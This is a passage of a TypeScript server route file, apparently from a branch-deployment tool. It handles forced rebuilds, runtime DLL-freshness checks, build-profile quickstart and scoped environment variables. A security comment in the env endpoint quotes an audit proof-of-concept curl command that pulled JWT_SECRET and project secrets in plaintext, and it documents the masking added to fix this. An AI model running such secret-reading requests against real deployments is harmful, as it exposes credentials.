  //       没重启进程 → 进程加载的字节码和磁盘 DLL 对不上。
  //
  // 本接口：停该 profile 的容器 → rm -rf bin/obj → 重启（重启后会 clean build）。
  // 对用 dotnet-restart 热更新模式的 profile 也适用，因为它的 cleanBeforeBuild 只在
  // 下次文件变更触发时清理，强制按钮让用户即时清理而不等变更。
  //
  // POST /api/branches/:branchSlug/force-rebuild/:profileId
  router.post('/branches/:branchSlug/force-rebuild/:profileId', async (req, res) => {
    const branchSlug = decodeURIComponent(req.params.branchSlug);
    const profileId = req.params.profileId;
    const branch = stateService.getBranch(branchSlug);
    const profile = stateService.getBuildProfile(profileId);
    if (!branch) { res.status(404).json({ error: `分支 "${branchSlug}" 不存在` }); return; }
    if (!profile) { res.status(404).json({ error: `构建配置 "${profileId}" 不存在` }); return; }
    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined;
    const actor = resolveActorFromRequest(req);
    const reserveDeploy =
      req.query.reserveDeploy === '1'
      || req.query.reserveDeploy === 'true'
      || req.body?.reserveDeploy === true;
    const deployScope = req.query.deployScope === 'branch' || req.body?.deployScope === 'branch'
      ? 'branch'
      : 'profile';

    const svc = branch.services?.[profileId];
    const containerName = svc?.containerName;
    const worktree = branch.worktreePath;
    if (!worktree) { res.status(400).json({ error: '分支无 worktreePath' }); return; }

    const branchOperationLease = beginBranchOperation(req, res, branch, {
      kind: 'force-rebuild',
      profileId,
      source: 'api.force-rebuild',
      reason: `强制干净重建 ${branchSlug}:${profileId}`,
      continueWith: reserveDeploy ? (deployScope === 'branch' ? 'deploy' : 'deploy-profile') : null,
    });
    if (branchOperationCoordinator && !branchOperationLease) return;
    let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
    const steps: Array<{ step: string; ok: boolean; detail?: string }> = [];

    try {
      assertBranchOperationCurrent(branchOperationLease, 'before-force-rebuild');
      // 1) 停容器
      if (containerName) {
        try {
          await containerService.remove(containerName, {
            projectId: branch.projectId,
            branchId: branch.id,
            profileId,
            requestId: requestId || null,
            operationId: branchOperationLease?.operationId || null,
            actor,
            trigger: typeof req.headers['x-cds-trigger'] === 'string' ? req.headers['x-cds-trigger'] : null,
            operation: 'force-rebuild',
            source: 'api.force-rebuild',
            reason: `强制干净重建 ${branchSlug}:${profileId}：停止旧容器以清理 bin/obj`,
          });
          steps.push({ step: `停止 ${containerName}`, ok: true });
        } catch (err) {
          steps.push({ step: `停止 ${containerName}`, ok: false, detail: (err as Error).message });
        }
      } else {
        steps.push({ step: '停止容器', ok: true, detail: '容器未运行，跳过' });
      }

      assertBranchOperationCurrent(branchOperationLease, 'before-force-rebuild-wipe');
      // 2) 物理删除 worktree 下目标 profile workDir 里的 bin / obj —— 绕过 MSBuild 增量
      const workDir = profile.workDir ? `${worktree}/${profile.workDir}` : worktree;
      const wipeCmd = `find ${shq(workDir)} -type d \\( -name bin -o -name obj \\) -prune -exec rm -rf {} + 2>/dev/null; echo done`;
      try {
        const result = await shell.exec(wipeCmd);
        if (result.exitCode !== 0) {
          steps.push({ step: 'rm -rf bin/obj', ok: false, detail: combinedOutput(result) });
        } else {
          steps.push({ step: 'rm -rf bin/obj', ok: true, detail: workDir });
        }
      } catch (err) {
        steps.push({ step: 'rm -rf bin/obj', ok: false, detail: (err as Error).message });
      }

      steps.push({
        step: reserveDeploy ? '已预留重新部署' : '等待调用方重新部署',
        ok: true,
        detail: reserveDeploy
          ? `构建缓存已清理，下一次${deployScope === 'branch' ? '全量' : '单服务'} deploy 将继承同一个 operationId，期间 webhook deploy 会被合并等待。`
          : '构建缓存已清理，前端/CLI 应随后触发 deploy；本端点本身不隐式拉起容器。',
      });

      stateService.recordDestructiveOp({
        type: 'other',
        projectId: branch.projectId || null,
        summary: `强制干净重建 ${branchSlug}:${profileId}（清 bin/obj）`,
      });

      res.json({
        branch: branchSlug,
        profile: profileId,
        operationId: branchOperationLease?.operationId,
        reserveDeploy,
        deployScope,
        workDir,
        steps,
        message: '已强制清理构建缓存。请继续部署以重新拉起服务。',
      });
    } catch (err) {
      branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
      res.status(branchOperationFinalStatus === 'cancelled' ? 409 : 500).json({ error: (err as Error).message, steps });
    } finally {
      completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
    }
  });

  // ── 运行时字节码一致性核验（2026-04-22 诊断工具）──
  //
  // 帮用户回答："我改的 .cs 到底生效了没有？"
  //
  // 三项对比：
  //   - 容器里 DLL 文件 mtime：echo $(stat /app/.../bin/.../*.dll | grep Modify)
  //   - 容器里 dotnet 进程 PID 启动时间：ps -o lstart -p $PID
  //   - 最近 50 行容器 stdout：看请求/日志是不是按新代码应有的行为走
  //
  // 如果 DLL mtime > 进程启动时间 → 进程加载的还是老字节码，需要重启。
  //
  // POST /api/branches/:branchSlug/verify-runtime/:profileId
  router.post('/branches/:branchSlug/verify-runtime/:profileId', async (req, res) => {
    const branchSlug = decodeURIComponent(req.params.branchSlug);
    const profileId = req.params.profileId;
    const branch = stateService.getBranch(branchSlug);
    if (!branch) { res.status(404).json({ error: `分支 "${branchSlug}" 不存在` }); return; }
    const svc = branch.services?.[profileId];
    const containerName = svc?.containerName;
    if (!containerName) {
      res.status(400).json({ error: `服务 "${profileId}" 未运行，无法诊断` });
      return;
    }
    const running = await containerService.isRunning(containerName).catch(() => false);
    if (!running) {
      const inspect = await shell.exec(`docker inspect --format="{{.State.Status}}" ${shq(containerName)}`).catch(err => ({
        exitCode: 1,
        stdout: '',
        stderr: (err as Error).message,
      }));
      const status = (inspect.stdout || '').trim();
      const detail = inspect.exitCode === 0 && status
        ? `容器 ${containerName} 当前状态为 ${status}，请先重新部署。`
        : `容器 ${containerName} 不存在或已被清理，请先重新部署。`;
      res.status(400).json({ error: `服务 "${profileId}" 未运行，无法诊断：${detail}` });
      return;
    }

    // 1) 进程启动时间
    const psCmd = `docker exec ${shq(containerName)} sh -c "ps -o lstart= -p 1 2>/dev/null || ps -o lstart= -p \\$(pgrep -f 'dotnet run' | head -1) 2>/dev/null || echo unknown"`;
    const ps = await shell.exec(psCmd).catch(err => ({ exitCode: 1, stdout: '', stderr: (err as Error).message }));

    // 2) DLL 时间戳（遍历 bin/ 下所有 .dll 取最新）
    const dllCmd = `docker exec ${shq(containerName)} sh -c "find . -name '*.dll' -path '*/bin/*' -printf '%T@ %p\\n' 2>/dev/null | sort -nr | head -5"`;
    const dll = await shell.exec(dllCmd).catch(err => ({ exitCode: 1, stdout: '', stderr: (err as Error).message }));

    // 3) 源码 .cs 最新改动时间
    const srcCmd = `docker exec ${shq(containerName)} sh -c "find . -name '*.cs' -not -path '*/bin/*' -not -path '*/obj/*' -printf '%T@ %p\\n' 2>/dev/null | sort -nr | head -1"`;
    const src = await shell.exec(srcCmd).catch(err => ({ exitCode: 1, stdout: '', stderr: (err as Error).message }));

    // 4) 最近 50 行日志
    const logs = await containerService.getLogs(containerName, 50).catch(() => '');

    // 解析和诊断
    const parseTop = (s: string) => {
      const first = s.split('\n').filter(Boolean)[0] || '';
      const [tsStr, ...pathParts] = first.split(/\s+/);
      const ts = parseFloat(tsStr);
      return { ts: Number.isFinite(ts) ? ts : null, path: pathParts.join(' ') };
    };

    const topDll = parseTop(dll.stdout || '');
    const topSrc = parseTop(src.stdout || '');

    const warnings: string[] = [];
    if (topSrc.ts && topDll.ts && topSrc.ts > topDll.ts) {
      warnings.push('警告 源码比 DLL 新：最新的 .cs 还没被编译进 DLL。说明容器内没跑重编译（watch 没触发或热更新没起）。');
    }
    // DLL 晚于进程启动时间 → 进程跑的还是老字节码
    const processStartStr = (ps.stdout || '').trim();
    if (topDll.ts && processStartStr && processStartStr !== 'unknown') {
      const procTs = Date.parse(processStartStr) / 1000;
      if (Number.isFinite(procTs) && topDll.ts > procTs + 5) {
        warnings.push(`警告 DLL 比进程启动时间新 (Δ=${Math.round(topDll.ts - procTs)}s)：进程还在跑老字节码。重启服务或点「强制 强制干净重建」。`);
      }
    }
    if (warnings.length === 0) {
      warnings.push('OK 未检测到明显不一致。如仍看不到预期日志，排查：日志级别过滤、LogError 是否真走到那个代码路径、Infrastructure.dll 是不是被引用/注入。');
    }

    res.json({
      branch: branchSlug,
      profile: profileId,
      container: containerName,
      processStart: processStartStr,
      latestDll: topDll,
      latestSource: topSrc,
      recentLogs: logs.split('\n').slice(-30).join('\n'),
      warnings,
    });
  });

  // ── Docker images (for dropdown selection) ──

  router.get('/docker-images', async (_req, res) => {
    try {
      const result = await shell.exec(
        `docker images --format '{"repo":"{{.Repository}}","tag":"{{.Tag}}","size":"{{.Size}}","id":"{{.ID}}"}'`,
        { timeout: 10_000 },
      );
      const images = result.stdout
        .trim()
        .split('\n')
        .filter(Boolean)
        .map(line => JSON.parse(line))
        .filter((img: { repo: string; tag: string }) => img.repo !== '<none>' && img.tag !== '<none>');
      res.json({ images });
    } catch {
      // Docker not accessible — return presets only
      res.json({ images: [] });
    }
  });

  // ── Package manager detection ──

  type PackageManager = 'npm' | 'pnpm' | 'yarn';

  /**
   * Detect the package manager for a Node.js project by checking lock files.
   * Priority: pnpm-lock.yaml > yarn.lock > package-lock.json > npm (default)
   */
  function detectPackageManager(projectDir: string): PackageManager {
    if (fs.existsSync(path.join(projectDir, 'pnpm-lock.yaml'))) return 'pnpm';
    if (fs.existsSync(path.join(projectDir, 'yarn.lock'))) return 'yarn';
    if (fs.existsSync(path.join(projectDir, 'package-lock.json'))) return 'npm';
    return 'npm';
  }

  // Cache base path is isolated per project. Servers keep /data by default;
  // desktop environments fall back to a writable local directory.
  const cacheBase = stateService.getCacheBase();

  /** Build command prefix and cache mount for a detected package manager */
  function nodeProfileCommands(pm: PackageManager) {
    switch (pm) {
      case 'pnpm':
        return {
          installPrefix: 'corepack enable && pnpm install --frozen-lockfile && ',
          runPrefix: 'corepack enable && pnpm exec ',
          cacheMounts: [{ hostPath: `${cacheBase}/pnpm`, containerPath: '/pnpm/store' }],
        };
      case 'yarn':
        return {
          installPrefix: 'corepack enable && yarn install --frozen-lockfile && ',
          runPrefix: 'corepack enable && yarn exec ',
          cacheMounts: [{ hostPath: `${cacheBase}/yarn`, containerPath: '/usr/local/share/.cache/yarn' }],
        };
      default:
        return {
          installPrefix: 'npm install && ',
          runPrefix: 'npx ',
          cacheMounts: [{ hostPath: `${cacheBase}/npm`, containerPath: '/root/.npm' }],
        };
    }
  }

  /**
   * Check if a build command uses pnpm/yarn without corepack enable prefix.
   * Returns a warning string or null if OK.
   */
  function checkCorepackPrefix(cmd: string | undefined, profileLabel: string): string | null {
    if (!cmd) return null;
    const needsCorepack = /\b(pnpm|yarn)\b/.test(cmd) && !/corepack\s+enable/.test(cmd);
    if (needsCorepack) {
      return `${profileLabel}: 命令使用了 pnpm/yarn 但缺少 "corepack enable &&" 前缀，在 node:*-slim 镜像中会失败`;
    }
    return null;
  }

  // ── Package manager detection API ──

  router.get('/detect-pm/:workDir', (_req, res) => {
    const workDir = _req.params.workDir;
    const fullPath = path.join(config.repoRoot, workDir);
    if (!fs.existsSync(fullPath)) {
      res.status(404).json({ error: `目录 "${workDir}" 不存在` });
      return;
    }
    const pm = detectPackageManager(fullPath);
    const commands = nodeProfileCommands(pm);
    res.json({ workDir, packageManager: pm, ...commands });
  });

  // ── Quickstart: seed default build profiles for this project ──

  router.post('/quickstart', (req, res) => {
    // Resolve project scope: ?project=<id> query, body.projectId, or
    // legacy 'default'. Without scoping, every project shared the
    // global build-profile list and "快速开始" on a fresh project
    // failed with 409 because the legacy project's profiles already
    // existed.
    const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
    const bodyProject = (req.body && typeof req.body.projectId === 'string') ? req.body.projectId : null;
    const projectId = bodyProject || queryProject || 'default';
    if (!stateService.getProject(projectId)) {
      res.status(400).json({ error: `未知项目: ${projectId}` });
      return;
    }

    const existing = stateService.getBuildProfilesForProject(projectId);
    if (existing.length > 0) {
      res.status(409).json({ error: '构建配置已存在。请先删除现有配置或手动添加。' });
      return;
    }

    // Use the project's actual repo root so stack detection looks at
    // the right tree. Legacy projects (no per-project repoPath) fall
    // back to config.repoRoot via getProjectRepoRoot.
    const projectRepoRoot = stateService.getProjectRepoRoot(projectId, config.repoRoot);
    const adminDir = path.join(projectRepoRoot, 'prd-admin');
    const pm = fs.existsSync(adminDir) ? detectPackageManager(adminDir) : 'npm';
    const nodeCmd = nodeProfileCommands(pm);

    // Look up the project up-front — we need the slug both for the
    // suffix convention (Task 2) and for all downstream ID collisions.
    // getProject can't be undefined here because we already validated
    // projectId above, but TS still needs the narrow.
    const project = stateService.getProject(projectId);
    const projectSlug = project?.slug || projectId;

    // addBuildProfile guards on global id uniqueness — the legacy
    // project already owns "api" / "admin" so non-legacy projects
    // must suffix their ids. Suffix uses the project slug (human
    // readable, e.g. "api-prd-agent-2") instead of the first 8 hex
    // chars of the id, because slugs survive state.json migrations
    // while hex UUIDs look like random noise in the topology view.
    const idSuffix = projectId === 'default' ? '' : `-${projectSlug}`;

    // Task 1: prefer a cds-compose file over the hardcoded template.
    // Only search inside the project's own git repo (projectRepoRoot).
    // Never search config.repoRoot — that is the CDS host directory shared
    // across all projects, so reading from it would let one project's compose
    // file silently contaminate a different project's build profiles.
    let composeYaml: string | null = null;
    const composeCandidates: string[] = [
      path.join(projectRepoRoot, 'cds-compose.yaml'),
      path.join(projectRepoRoot, 'cds-compose.yml'),
    ];
    // De-duplicate paths (projectRepoRoot may equal config.repoRoot for legacy)
    const seen = new Set<string>();
    for (const composePath of composeCandidates) {
      if (seen.has(composePath)) continue;
      seen.add(composePath);
      if (fs.existsSync(composePath)) {
        try {
          composeYaml = fs.readFileSync(composePath, 'utf8');
          break;
        } catch {
          // Fall through to the next candidate / hardcoded template.
        }
      }
    }

    if (composeYaml) {
      const parsed = parseCdsCompose(composeYaml);
      if (parsed && parsed.buildProfiles.length > 0) {
        const seeded: BuildProfile[] = [];
        for (const bp of parsed.buildProfiles) {
          const profile: BuildProfile = {
            ...bp,
            id: `${bp.id}${idSuffix}`,
            projectId,
          };
          stateService.addBuildProfile(profile);
          seeded.push(profile);
        }

        // Merge envVars — never clobber user-authored vars. Since the
        // compose belongs to this project, seed values into the project
        // scope (so e.g. a JWT_SECRET from cds-compose.yaml doesn't leak
        // into sibling projects). Skip when either global OR project
        // already has the key — both are user-authored sources of truth.
        const mergedExisting = stateService.getCustomEnv(projectId);
        for (const [key, value] of Object.entries(parsed.envVars)) {
          if (mergedExisting[key] === undefined) {
            stateService.setCustomEnvVar(key, value, projectId);
          }
        }

        // Add infra services only when this project doesn't already
        // have one with the same id. Scope to projectId so two projects
        // can both declare their own `mongo` without colliding in the
        // global infraServices list.
        const existingInfra = stateService.getInfraServicesForProject(projectId);
        const existingInfraIds = new Set(existingInfra.map(s => s.id));
        for (const def of parsed.infraServices) {
          if (existingInfraIds.has(def.id)) continue;
          const service = composeDefToInfraService(def, projectId);
          stateService.addInfraService(service);
        }

        stateService.save();

        // Report env vars that still have TODO placeholder values so the
        // frontend can open the env editor immediately after quickstart.
        const allProjectEnv = stateService.getCustomEnv(projectId);
        const pendingEnvVars = Object.entries(allProjectEnv)
          .filter(([, v]) => typeof v === 'string' && v.startsWith('TODO:'))
          .map(([k]) => k);

        res.status(201).json({
          message: `快速启动: 已从 cds-compose.yaml 创建 ${seeded.length} 个构建配置`,
          profiles: seeded,
          detectedPackageManager: pm,
          source: 'cds-compose',
          pendingEnvVars,
        });
        return;
      }
    }

    // Fallback: hardcoded template (pre-cds-compose.yaml projects).
    const defaults: BuildProfile[] = [
      {
        id: 'api',
        projectId,
        name: 'Backend API (.NET 8)',
        dockerImage: 'mcr.microsoft.com/dotnet/sdk:8.0',
        workDir: 'prd-api',
        command: 'dotnet restore && dotnet build --no-restore && dotnet run --no-build --project src/PrdAgent.Api/PrdAgent.Api.csproj --urls http://0.0.0.0:8080',
        containerPort: 8080,
        cacheMounts: [
          { hostPath: `${cacheBase}/nuget`, containerPath: '/root/.nuget/packages' },
        ],
      },
      {
        id: 'admin',
        projectId,
        name: 'Admin Panel (Vite)',
        dockerImage: 'node:20-slim',
        workDir: 'prd-admin',
        command: `${nodeCmd.installPrefix}${nodeCmd.runPrefix}vite --host 0.0.0.0 --port 5173`,
        containerPort: 5173,
        cacheMounts: nodeCmd.cacheMounts,
        // Wait for Vite to fully initialize (CSS/plugin pipeline ready) before routing traffic.
        // Without this, the proxy forwards requests while Vite is still starting, causing
        // CSS MIME type errors (Vite returns HTML fallback before transforms are ready).
        startupSignal: '->  Network:',
      },
    ];

    for (const profile of defaults) {
      profile.id = `${profile.id}${idSuffix}`;
      stateService.addBuildProfile(profile);
    }
    stateService.save();

    res.status(201).json({
      message: `快速启动: 已创建 ${defaults.length} 个构建配置 (检测到包管理器: ${pm})`,
      profiles: defaults,
      detectedPackageManager: pm,
      source: 'template',
    });
  });

  // ── Custom environment variables (scoped: _global + per-project) ──
  //
  // Every endpoint accepts an optional `?scope=_global|<projectId>`
  // query. When omitted it defaults to `_global` so pre-feature
  // clients (that had no scope concept) keep working untouched.
  //
  // Only `_global` vars participate in syncCdsConfig() (rootDomains /
  // repoRoot etc. must be process-wide). Project-scoped vars go
  // straight into container env at deploy time.

  function resolveScopeAndSource(req: import('express').Request): { scope: string; fromBody: boolean } {
    // Phase 7 fix(B14,2026-05-01):同时接受 ?scope= query 和 body.scope。
    // 历史上只读 query,导致 PUT /api/env body 里写 scope 被静默忽略,环境
    // 变量落到错误的 _global 作用域。Twenty 实战暴露。
    //
    // Bugbot fix(PR #521 第九轮 Bug 1)— 暴露 scope 来源,让调用方能区分
    // body.scope 是"meta 字段"还是"真 env var"。当 ?scope= 已显式指定时,
    // body.scope 是用户的真实 env(不该被剥),仅当 ?scope= 缺失而 body.scope
    // 用作 meta 时才需要剥。
    const raw = req.query.scope;
    const queryScope = typeof raw === 'string' ? raw.trim() : '';
    if (queryScope) return { scope: queryScope, fromBody: false };
    const bodyScope = req.body && typeof req.body === 'object' && typeof (req.body as Record<string, unknown>).scope === 'string'
      ? ((req.body as Record<string, string>).scope).trim()
      : '';
    return { scope: bodyScope || '_global', fromBody: !!bodyScope };
  }

  function resolveScope(req: import('express').Request): string {
    return resolveScopeAndSource(req).scope;
  }

  router.get('/env', (req, res) => {
    const scope = resolveScope(req);

    // SECURITY P1.5 (2026-05-09): /api/env GET historically returned plaintext
    // values to ANY caller with a valid AI_ACCESS_KEY (static / cdsg_ / cdsp_
    // any-project). The audit P1.5 PoC showed
    //   curl -H "X-AI-Access-Key: $static" /api/env?scope=_global  → JWT_SECRET plaintext
    //   curl -H "X-AI-Access-Key: $static" /api/env?scope=<projId> → project secret plaintext
    //
    // Mirror the masking applied to /api/projects (routes/projects.ts) and
    // /branches/:id/effective-env/reveal: only the project owner (cdsp_ key
    // matching scope, or human cookie session) sees plaintext. Everyone else
    // gets `***[masked]***` — UI keeps rendering "X env vars configured" but
    // no machine credential walks away with the secret material.
    const projKey = (req as any).cdsProjectKey as { projectId: string } | undefined;
    const cookieAuth = (req as any)._cdsCookieAuth === true;
    const maskValues = (env: Record<string, string>): Record<string, string> => {
      const out: Record<string, string> = {};
      for (const k of Object.keys(env || {})) out[k] = '***[masked]***';
      return out;
    };
    const ownerOkFor = (s: string): boolean => {
      if (cookieAuth) return true;
      if (projKey && projKey.projectId === s) return true;
      return false;
    };

    // /env?scope=_all — give the Settings UI the full scoped map in one
    // round trip so it can render both global and per-project vars.
    if (scope === '_all') {
      const raw = stateService.getCustomEnvRaw();
      // _all spans every scope incl. _global; only cookie auth (admin UI)
      // may see plaintext. Any token-based caller gets full mask.
      if (cookieAuth) {
        res.json({ env: raw, scope: '_all' });
        return;
      }
      const masked: Record<string, Record<string, string>> = {};
      for (const s of Object.keys(raw || {})) masked[s] = maskValues(raw[s] || {});
      res.json({ env: masked, scope: '_all' });
      return;
    }
    // Phase 8 — 项目级 scope 同时返回 envMeta + missingRequired,UI 弹窗一次拿到全部数据
    //
    // Bugbot fix(PR #521 第十一轮 Bug 2)— 同时返回 globalEnv,让 UI 能区分
    // "项目级未填但已被全局填了"vs"项目级 + 全局都没填"。原行为:env 只含
    // 项目 scope 的值,而 missingRequiredEnvKeys 是按 merged(global ⊕ project)
    // 算的,导致 UI 上一个全局已填的 required key 既不显示值也不报 missing,
    // 视觉上"空白但不告警"产生数据错觉。
    const rawEnv = stateService.getCustomEnvScope(scope);
    const env = ownerOkFor(scope) ? rawEnv : maskValues(rawEnv);
    if (scope !== '_global') {
      const project = stateService.getProject(scope);
      if (project) {
        const envMeta = stateService.getEnvMeta(scope);
        const missingRequiredEnvKeys = stateService.getMissingRequiredEnvKeys(scope);
        const rawGlobal = stateService.getCustomEnvScope('_global');
        // _global plaintext only when caller owns _global (i.e. cookie auth);
        // a project-scoped cdsp_ key sees its own project plaintext but
        // global stays masked (consistent with reveal/customEnv P1 model).
        const globalEnv = ownerOkFor('_global') ? rawGlobal : maskValues(rawGlobal);
        res.json({ env, scope, envMeta, missingRequiredEnvKeys, globalEnv });
        return;
      }
    }
    res.json({ env, scope });
  });

  // Phase 9.5 — env 修改审计日志读取:GET /api/env/audit?scope=<projectId>
  //
  // Bugbot fix(PR #521 第十轮 Bug 2)— 静态路径 /env/audit 必须排在任何
  // 形如 GET /env/:key 的参数化路径之前,即使当前没有 GET /env/:key,也提前
  // 锁住注册顺序,避免后人随手加 :key 把 /audit 当成 key 名截胡。
  // resolveScope 已防御性地处理 GET 请求(Express 通常不解析 GET body,
  // typeof req.body === 'object' 检查会让 fromBody 走假分支,scope 兜底 _global)。
  router.get('/env/audit', (req, res) => {
    const scope = resolveScope(req);
    if (scope === '_global' || scope === '_all') {
      res.status(400).json({ error: '审计日志只对项目级 scope 可用' });
      return;
    }
    if (!stateService.getProject(scope)) {
      res.status(404).json({ error: `项目 '${scope}' 不存在` });
      return;
    }
    res.json({ scope, entries: stateService.getEnvChangeLog(scope) });
  });

  // Helper: sync CDS-relevant env vars into runtime config.
  // Only reads _global — cross-project config can't be project-scoped.
  function syncCdsConfig() {
    const env = stateService.getCustomEnvScope('_global');
    if (env.ROOT_DOMAINS) config.rootDomains = env.ROOT_DOMAINS.split(',').map(v => v.trim()).filter(Boolean);
    if (env.SWITCH_DOMAIN) config.switchDomain = env.SWITCH_DOMAIN;
    if (env.MAIN_DOMAIN) config.mainDomain = env.MAIN_DOMAIN;
    if (env.DASHBOARD_DOMAIN) config.dashboardDomain = env.DASHBOARD_DOMAIN;
    if (env.PREVIEW_DOMAIN) config.previewDomain = env.PREVIEW_DOMAIN;
    if (config.rootDomains?.length) {
      if (!env.MAIN_DOMAIN) config.mainDomain = config.rootDomains[0];
      if (!env.DASHBOARD_DOMAIN) config.dashboardDomain = config.rootDomains[0];
      if (!env.PREVIEW_DOMAIN) config.previewDomain = config.rootDomains[0];
    }
    // Repo root & worktree base: allow UI override for directory isolation.
    // P4 Part 18 (G1.2): WorktreeService is now stateless, so we just
    // mutate config.repoRoot — call-sites read it via config or via
    // stateService.getProjectRepoRoot(projectId, config.repoRoot).
    if (env.CDS_REPO_ROOT) {
      config.repoRoot = env.CDS_REPO_ROOT;
    }
    if (env.CDS_WORKTREE_BASE) config.worktreeBase = env.CDS_WORKTREE_BASE;
  }

  router.put('/env', (req, res) => {
    const { scope, fromBody } = resolveScopeAndSource(req);
    if (scope === '_all') {
      res.status(400).json({ error: '_all 仅用于读取，写入请指定具体 scope' });
      return;
    }
    const rawBody = req.body as Record<string, string>;
    if (!rawBody || typeof rawBody !== 'object') {
      res.status(400).json({ error: '请求体必须是键值对对象' });
      return;
    }
    // Phase 7 fix(B14,2026-05-01):剔除 'scope' 元字段,避免它被当成名为
    // "scope" 的 env var 污染。两种调用方式都正确处理:
    //   ① ?scope=<sid> + body 是纯 env dict          → 等价旧行为
    //   ② body 含 { scope: <sid>, KEY: VAL, ... }    → resolveScope 取 body.scope,
    //      setCustomEnv 收到去掉 scope 的 dict
    //
    // Bugbot fix(PR #521 第九轮 Bug 1)— 仅当 body.scope 用作 meta 字段
    //(即 ?scope= 缺失,scope 来自 body)时才剥;若 ?scope= 已显式指定,
    // body.scope 是用户真实想存的 env var,不能默默丢。
    const env: Record<string, string> = {};
    for (const [k, v] of Object.entries(rawBody)) {
      if (k === 'scope' && fromBody) continue;
      env[k] = v;
    }
    stateService.setCustomEnv(env, scope);
    // Phase 8 — 项目级 env 修改时同步 defaultEnv,作为新分支创建时的继承模板。
    //
    // Bugbot fix(PR #521 第九轮 Bug 2)— defaultEnv 改回整体替换(替代第八轮的
    // merge 实现)。理由:PUT /env 的 customEnv 是 bulk-replace,defaultEnv 作为
    // "新分支继承模板"应当与 customEnv 严格同步,否则用户 PUT 整体 env 后会
    // 残留旧 key,新分支继承时把删掉的密钥/废弃配置又拉回来。删除单 key 走
    // DELETE /env/:key,已显式 sync defaultEnv(Phase 9.5)。
    if (scope !== '_global' && stateService.getProject(scope)) {
      stateService.setDefaultEnv(scope, env);
      // Phase 9.5 — 审计日志:记录 bulk-replace 操作 + 涉及的 keys
      stateService.appendEnvChangeLog(scope, {
        op: 'bulk-replace',
        keys: Object.keys(env),
        actor: resolveActorFromRequest(req),
        source: 'api',
      });
    }
    stateService.save();
    syncCdsConfig();
    res.json({ message: '环境变量已更新', env, scope });
  });

  router.put('/env/:key', (req, res) => {
    const { key } = req.params;
    const { value } = req.body as { value?: string };
    if (value === undefined) {
      res.status(400).json({ error: '值不能为空' });
      return;
    }
    const scope = resolveScope(req);
    if (scope === '_all') {
      res.status(400).json({ error: '_all 仅用于读取' });
      return;
    }
    stateService.setCustomEnvVar(key, value, scope);
    // Phase 8 — 项目级单 key 修改时同步 defaultEnv(新分支继承)
    if (scope !== '_global' && stateService.getProject(scope)) {
      const current = stateService.getDefaultEnv(scope);
      current[key] = value;
      stateService.setDefaultEnv(scope, current);
      // Phase 9.5 — 审计:single key set
      stateService.appendEnvChangeLog(scope, {
        op: 'set',
        keys: [key],
        actor: resolveActorFromRequest(req),
        source: 'api',
      });
    }
    stateService.save();
    syncCdsConfig();
    res.json({ message: `Set ${key}`, scope });
  });

  router.delete('/env/:key', (req, res) => {
    const { key } = req.params;
    const scope = resolveScope(req);
    if (scope === '_all') {
      res.status(400).json({ error: '_all 仅用于读取' });
      return;
    }
    stateService.removeCustomEnvVar(key, scope);
    // Bugbot fix(PR #521)+ Codex P2:同步从 defaultEnv 删,否则 PUT /env*
    // 已删的 key 还在 defaultEnv 模板里,新分支创建时会被 inheritDefaultEnv 复活
    //(典型场景:用户删了一个泄漏的 SMTP 密码,下次 webhook 自动建分支又把它注回去)
    if (scope !== '_global' && stateService.getProject(scope)) {
      const current = stateService.getDefaultEnv(scope);
      if (key in current) {
        delete current[key];
        stateService.setDefaultEnv(scope, current);
      }
      // Phase 9.5 — 审计:delete
      stateService.appendEnvChangeLog(scope, {
        op: 'delete',
        keys: [key],
        actor: resolveActorFromRequest(req),
        source: 'api',
      });
    }
    stateService.save();
    res.json({ message: `Deleted ${key}`, scope });
  });

  // ── Smart categorize: 把全局 customEnv 整理成「CDS 读全局 / 项目读项目」两套独立副本 ──
  //
  // 背景（2026-04-27 用户反馈）：dashboard「全局」customEnv 塞了 17 个
  // prd-api 项目变量。用户要彻底隔离：
  //   - CDS 读全局（CDS_* 和历史无前缀名 JWT_SECRET / PREVIEW_DOMAIN 等
  //     —— syncCdsConfig() 在第 3826-3845 行真的从 _global 读它们）
  //   - 项目读项目（project.customEnv）
  //   - 历史重名（如 JWT_SECRET）= 两边都需要 → **复制成两份独立副本**
  //
  // classifyEnvKey 的三类对应三种处理：
  //   cds-canonical (CDS_*)    → 留全局，不复制（项目用不上）
  //   cds-legacy (JWT_SECRET)  → 留全局 + 复制一份到项目
  //                              （CDS 读全局副本，项目读项目副本，互不影响）
  //   unknown (GITHUB_PAT 等)  → 移到项目（CDS 不读，全局删）
  //
  // 撞名（项目里已有同名变量）：以项目里现有的为准，不覆盖；
  //   legacy 撞名 → 全局留 + 项目保持原值（两边各有各的）
  //   unknown 撞名 → 全局删 + 项目保持原值
  //
  // dryRun=true 只返回 plan 不改 state；false 则按 plan 真改 + save。
  router.post('/env/categorize', (req, res) => {
    const body = (req.body || {}) as { targetProjectId?: string; dryRun?: boolean };
    const targetProjectId = (body.targetProjectId || '').trim();
    const dryRun = body.dryRun === true;
    if (!targetProjectId) {
      res.status(400).json({ error: '缺少 targetProjectId（移到哪个项目）' });
      return;
    }
    if (targetProjectId === '_global' || targetProjectId === '_all') {
      res.status(400).json({ error: 'targetProjectId 不能是 _global 或 _all' });
      return;
    }
    const targetProject = stateService.getProject(targetProjectId);
    if (!targetProject) {
      res.status(404).json({ error: `项目 "${targetProjectId}" 不存在` });
      return;
    }

    const globalEnv = stateService.getCustomEnvScope('_global');
    const projectEnv = stateService.getCustomEnvScope(targetProjectId);

    // 计划：每个全局变量的处置 = (是否写项目, 是否从全局删, 是否撞名)
    // entry.flow ∈
    //   'global-only'      只 CDS 用，全局保留，项目不复制（CDS_*）
    //   'duplicate'        两边都需要，全局保留 + 复制到项目 (legacy 不撞名)
    //   'duplicate-skip'   legacy 撞名：全局保留，项目保持原值（两边各自隔离）
    //   'move'             unknown：从全局删除 + 写到项目
    //   'move-skip'        unknown 撞名：全局删除，项目保持原值
    type Flow = 'global-only' | 'duplicate' | 'duplicate-skip' | 'move' | 'move-skip';
    const plan: Array<{ key: string; value: string; flow: Flow; classification: string; projectExisting?: string }> = [];

    for (const [key, value] of Object.entries(globalEnv)) {
      const cls = classifyEnvKey(key);
      const projectHas = Object.prototype.hasOwnProperty.call(projectEnv, key);
      const projectVal = projectHas ? projectEnv[key] : undefined;
      let flow: Flow;
